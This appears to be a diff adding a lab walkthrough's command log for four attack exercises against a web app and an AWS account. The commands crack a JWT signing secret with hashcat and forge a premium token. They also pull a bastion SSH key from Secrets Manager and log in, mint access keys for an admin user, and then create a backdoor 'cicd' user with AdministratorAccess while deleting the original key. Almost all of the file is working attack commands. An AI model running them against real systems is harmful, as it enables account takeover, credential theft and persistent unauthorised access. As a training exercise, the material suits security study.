@@ -1,0 +1,46 @@
+command used
+
+------------------------------------------------exercise 1
+echo -n "eyJpZCI6NywiZmlyc3RfbmFtZSI6IkxlYXJuZXIiLCJsYXN0X25hbWUiOiJMZWFybmVyIiwiZW1haWwiOiJsZWFybmVyQHRlc3QuaW50ZXJuYWwiLCJpc19wcmVtaXVtIjpudWxsLCJleHAiOjE3NDY1NTc5NzF9" | base64 -d
+
+echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywiZmlyc3RfbmFtZSI6IkxlYXJuZXIiLCJsYXN0X25hbWUiOiJMZWFybmVyIiwiZW1haWwiOiJsZWFybmVyQHRlc3QuaW50ZXJuYWwiLCJpc19wcmVtaXVtIjpudWxsLCJleHAiOjE3NDY1NTc5NzF9.pkZ4RJIDQAW9Zg3vBZrYUmhlwjAQPKZEF5o8-8KPaaw" > /tmp/jwt_to_crack.txt
+
+curl -o /tmp/scraped-jwt-secrets.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/scraped-JWT-secrets.txt > /dev/null 2>&1
+
+hashcat -a 0 -m 16500 /tmp/jwt_to_crack.txt /tmp/scraped-jwt-secrets.txt
+
+python -c "import jwt, datetime; print(jwt.encode({'id':7,'first_name':'Learner','last_name':'Learner','email':'learner@test.internal','is_premium':True,'exp':int(datetime.datetime.now().timestamp() + 24*60*60)}, 'this-secret-strength-is-over-nine-thousand', algorithm='HS256'))"
+
+{"id":7,"first_name":"Learner","last_name":"Learner","email":"learner@test.internal","is_premium":true,"user_id":7,"address_id":7,"street":"EverGreen ;","city":"SpringField","state":"asdf a","zipcode":"09595","country":"USA"}
+
+------------------------------------------------exercise 2
+aws secretsmanager list-secrets
+
+aws secretsmanager get-secret-value --secret-id bastion-ssh-access-key-20250505054632 --query 'SecretString' --output text | base64 -d | tee /tmp/bastion.pem
+
+aws ec2  describe-instances --filter Name=instance-state-name,Values=running --query 'Reservations[].Instances[].{Tags: Tags,PublicName: PublicDnsName,PublicIP:PublicIpAddress}'
+
+chmod 600 /tmp/bastion.pem
+
+ssh -i /tmp/bastion.pem ec2-user@54.226.88.164
+
+aws sts get-caller-identity
+
+------------------------------------------------exercise 3
+aws iam list-users
+
+aws iam create-access-key --user admin-mason
+
+aws configure --profile admin-mason
+
+aws sts get-caller-identity --profile admin-mason
+
+------------------------------------------------exercise 4
+aws iam create-user --user-name cicd --profile admin-mason
+
+aws iam attach-user-policy --user-name cicd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile admin-mason
+
+aws iam create-access-key --user-name cicd --profile admin-mason
+
+aws iam delete-access-key --user-name admin-mason --access-key-id AKIARLO3TVYSG6LN3GFT --profile admin-mason
+
